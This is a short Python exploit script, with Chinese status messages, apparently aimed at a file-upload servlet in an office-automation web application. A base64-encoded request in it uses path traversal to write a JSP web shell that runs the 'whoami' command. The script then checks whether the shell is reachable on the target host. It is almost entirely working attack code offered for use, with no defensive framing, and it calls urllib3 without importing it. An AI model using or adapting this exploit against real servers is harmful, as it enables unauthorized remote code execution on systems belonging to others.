import requests
import sys
import base64
urllib3.disable_warnings()

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
          "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
          "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
          "Accept-Encoding": "gzip, deflate",
          "Cookie": "OASESSIONID=52142AC4FD797FAF815BCBEA7872A355; LocLan=zh_CN",
          "Cache-Control":"max-age=0"}
data='REJTVEVQIFYzLjAgICAgIDE0MSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgMjI2ICAgICAgICAgICAgIERCU1RFUD1SRUpUVkVWUQ0KT1BUSU9OPVUwRldSVVpKVEVVPQ0KUkVDT1JESUQ9DQppc0RvYz1kSEoxWlE9PQ0KbW9kdWxlVHlwZT1aMjkyWkc5amRXMWxiblE9DQpGSUxFVFlQRT1MaTR2TGk0dmRYQnNiMkZrTDJoMGJXd3ZVMUpETG1wemNBPT0NCjwlIHtqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygid2hvYW1pIikuZ2V0SW5wdXRTdHJlYW0oKTtpbnQgYSA9IC0xO2J5dGVbXSBiID0gbmV3IGJ5dGVbMjA0OF07b3V0LnByaW50KCI8cHJlPiIpO3doaWxlKChhPWluLnJlYWQoYikpIT0tMSl7b3V0LnByaW50bG4oIndob2FtaToiK25ldyBTdHJpbmcoYikpO31vdXQucHJpbnQoIjwvcHJlPiIpO30gJT4='
datas=base64.b64decode(data)
flag="DBSTEP V3.0     0               0               0"
host=sys.argv[1]
url_playload1='/defaultroot/officeserverservlet'
url_playload2='/defaultroot/upload/html/SRC.jsp'
urls=host+url_playload1
try:
    response=requests.post(url=urls,headers=headers,data=datas,verify=False)
    if flag in response.text:
        print(host+' 上传成功')
        urls=host+url_playload2
        response2=requests.post(url=urls,headers=headers,data=datas,verify=False)
        if response2.status_code==200:
            print("返回路径为："+urls)
        else:
            print("返回路径验证失败，请手工验证："+urls)
    else:
        print(host+" 上传失败")
except Exception as e:
    print(host+" 漏洞不存在或网站异常"+e)